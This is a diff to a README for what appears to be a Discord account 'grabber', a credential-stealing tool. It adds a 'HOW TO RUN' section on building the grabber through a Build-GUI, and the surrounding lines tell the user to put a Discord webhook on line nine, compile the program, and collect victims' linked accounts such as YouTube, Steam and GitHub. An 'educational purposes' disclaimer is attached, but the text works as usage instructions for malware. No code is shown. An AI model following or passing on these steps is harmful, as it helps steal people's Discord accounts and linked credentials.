@@ -9,6 +9,9 @@ Unfortunately, after being "skidded" every time I made programs, I don't really 
 **The program has been made for educational purposes, do not use it for malicious purposes.**<br>
 You only have to input your Discord webhook on line nine and compile it.
 
+> **HOW TO RUN**
+When you have downloaded the file you will need to open and start the Build-GUI. After you have started the Build-GUI it will show you how to make the grabber.
+
 > **NOTES**
 I updated all old Discord API versions on request links.
 For the account connections (linked accounts) like YouTube, Steam, Github...
